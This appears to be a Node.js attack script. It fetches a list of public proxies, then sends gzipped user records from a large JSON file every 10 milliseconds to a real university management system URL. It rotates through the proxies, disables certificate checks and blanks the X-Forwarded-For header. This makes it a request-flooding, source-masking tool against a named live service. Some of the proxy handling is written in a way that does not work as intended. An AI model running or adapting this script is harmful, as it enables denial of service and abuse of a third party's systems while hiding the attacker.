const axios = require('axios');
const https = require('https');
const fs = require('fs');
const zlib = require('zlib'); 

const proxyListUrl = 'https://proxylist.geonode.com/api/proxy-list?filterPort=80&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc';
const testUrl = 'https://ums.lpu.in/lpuums/'; 

// Function to fetch proxy list
async function fetchProxies() {
  try {
    const response = await axios.get(proxyListUrl);
    return response.data.data;  
  } catch (error) {
    console.error('Error fetching proxy list:', error);
    return [];
  }
}

// Read JSON data from file
function loadUserData() {
  try {
    const data = fs.readFileSync('40mb.json'); 
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading user data:', error);
    return [];
  }
}


async function sendRequestWithProxy(proxy, data) {

  const agent = new https.Agent({
    rejectUnauthorized: false,
    proxy: {
      host: proxy.ip,
      port: proxy.port,
      protocol: 'http', 
    },
  });

  try {
   
    const compressedData = zlib.gzipSync(JSON.stringify(data));

  
    const response = await axios.post(testUrl, compressedData, {
      httpsAgent: agent,
      headers: {
        'Content-Type': 'application/json',
        'Content-Encoding': 'gzip', 
        'X-Forwarded-For': '', 
      },
      maxRedirects: 0,  
    });

    if (response.status === 200) {
      console.log(`Request via proxy ${proxy.ip} was successful with status: ${response.status}`);
    } else {
      console.log(`Request via proxy ${proxy.ip} failed with status: ${response.status}`);
    }
  } catch (error) {
    console.error(`Error with proxy ${proxy.ip}: ${error.message}`);
  }
}


async function testWithProxies() {
  const proxies = await fetchProxies();
  if (proxies.length === 0) {
    console.error('No proxies available');
    return;
  }

  const userData = loadUserData();
  if (userData.length === 0) {
    console.error('No user data available');
    return;
  }

  let index = 0;
  setInterval(() => {
    const proxy = proxies[index];
    const user = userData[index % userData.length]; 
    console.log(`Sending request using proxy: ${proxy.ip} for user: ${user.name}`);
    sendRequestWithProxy(proxy, user); 

    index = (index + 1) % proxies.length; 
  }, 10);  
}


testWithProxies();
